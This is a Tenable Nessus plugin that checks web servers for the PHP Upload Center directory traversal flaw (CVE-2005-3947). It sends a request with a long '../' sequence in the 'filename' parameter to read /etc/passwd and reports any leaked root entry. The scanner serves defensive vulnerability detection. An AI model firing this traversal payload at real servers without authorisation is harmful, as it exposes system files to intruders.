#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by a
directory traversal vulnerability. 

Description :

The remote host is running PHP Upload Center, a file manager written
in PHP. 

The version of PHP Upload Center installed on the remote host suffers
fails to remove directory traversal sequences user input to the
'filename' parameter of the 'index.php' script.  An attacker can
leverage this flaw to read arbitrary files on the remote host subject
to the privileges of the web server user id. 

See also :

http://www.blogcu.com/Liz0ziM/126975/

Solution : 

Unknown at this time.

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:P/I:N/A:N/B:N)";


if (description) {
  script_id(20402);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2005-3947");
  script_bugtraq_id(15621, 15626);

  script_name(english:"PHP Upload Center filename Parameter Directory Traversal Vulnerability");
  script_summary(english:"Checks for filename parameter directory traversal vulnerability in PHP Upload Center");
 
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/upload", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw to read a file.
  file = "../../../../../../../../../../../../../etc/passwd";
  req = http_get(
    item:string(
      dir, "/index.php?",
      "action=view&",
      "filename=", file
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res)) {
      output = strstr(res, "<font face=");
      if (output) output = strstr(output, ">");
      if (output) output = output - ">";
      if (output) output = output - strstr(output, '</font>');
      if (isnull(output)) output = res;

      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        output
      );

    security_note(port:port, data:report);
    exit(0);
  }
}
